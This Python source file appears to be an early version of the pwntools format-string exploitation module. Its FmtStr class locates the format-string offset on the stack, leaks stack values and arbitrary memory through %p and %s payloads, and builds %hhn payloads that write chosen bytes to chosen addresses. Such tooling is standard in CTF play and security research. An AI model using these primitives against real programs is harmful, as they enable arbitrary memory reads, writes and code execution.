import re
import logging

from pwnlib.util.cyclic import *
from pwnlib.util.packing import *
from pwnlib.util.fiddling import randoms
from pwnlib.memleak import MemLeak
from pwnlib.log import getLogger

log = getLogger("pwnlib.fmtstr")

class FmtStr(object):
    def __init__(self, execute_fmt, offset = None, padlen = 0, numbwritten = 0):
        self.execute_fmt = execute_fmt
        self.offset = offset
        self.padlen = padlen
        self.numbwritten = numbwritten


        if self.offset == None:
            self.offset, self.padlen = self.find_offset()
            log.info("Found format string offset: %d", self.offset)

        self.writes = []
        self.leaker = MemLeak(self._leaker)

    def leak_stack(self, offset, prefix=""):
        leak = self.execute_fmt(prefix+"START%%%d$pEND" % offset)
        try:
            leak = re.findall(r"START(.*)END", leak, re.MULTILINE | re.DOTALL)[0]
            leak = int(leak, 16)
        except ValueError:
            leak = 0
        return leak

    def find_offset(self):
        marker = cyclic(20)
        for off in range(1,1000):
            leak = self.leak_stack(off, marker)
            leak = p32(leak)

            pad = cyclic_find(leak)
            if pad >= 0 and pad < 20:
                return off, pad
        else:
            log.error("Could not find offset to format string on stack")
            return None, None

    def _leaker(self, addr):
        # Hack: elfheaders often start at offset 0 in a page,
        # but we often can't leak addresses containing null bytes,
        # and the page below elfheaders is often not mapped.
        # Thus everything on a page boundry is a "\x7f"
        # unless it is leaked otherwise.
        if addr & 0xfff == 0: return "\x7f"

        fmtstr = randoms(self.padlen) + p32(addr) + "START%%%d$sEND" % self.offset

        leak = self.execute_fmt(fmtstr)
        leak = re.findall(r"START(.*)END", leak, re.MULTILINE | re.DOTALL)[0]

        leak += "\x00"

        return leak

    def execute_writes(self):
        addrs = []
        bytes = []

        #convert every write into single-byte writes
        for addr, data in self.writes:
            data = flat(data)
            for off, b in enumerate(data):
                addrs.append(addr+off)
                bytes.append(u8(b))

        fmtstr = randoms(self.padlen) + flat(addrs)
        n = self.numbwritten + len(fmtstr)

        for i, b in enumerate(bytes):
            n %= 256
            b -= n
            if b <= 0:
                b += 256
            fmtstr += "%%%dc%%%d$hhn" % (b, self.offset + i)
            n += b

        self.execute_fmt(fmtstr)
        self.writes = []

    def write(self, addr, data):
        self.writes.append((addr, data))
